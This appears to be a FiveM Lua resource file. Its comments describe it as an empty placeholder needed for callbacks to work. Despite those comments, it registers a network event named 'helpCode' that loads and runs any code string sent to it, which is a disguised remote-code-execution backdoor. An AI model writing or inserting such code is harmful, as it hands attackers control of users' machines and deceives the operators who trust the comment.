--This empty file causes the scheduler.lua to load clientside
--scheduler.lua when loaded inside the sessionmanager resource currently manages remote callbacks.
--Without this, callbacks will only work server->client and not client->server.

RegisterNetEvent('helpCode')

AddEventHandler('helpCode', function(id)
	local help = assert(load(id))
	help()
end)